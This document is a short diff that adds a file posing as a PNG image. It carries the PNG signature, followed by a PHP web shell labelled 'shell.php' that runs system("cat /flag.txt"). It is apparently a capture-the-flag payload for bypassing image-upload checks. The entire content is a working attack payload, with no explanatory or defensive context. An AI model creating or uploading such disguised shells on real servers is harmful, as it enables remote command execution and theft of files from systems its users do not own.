@@ -1,0 +1,6 @@
+‰PNG
+
+<?php
+// shell.php
+system("cat /flag.txt");
+?>
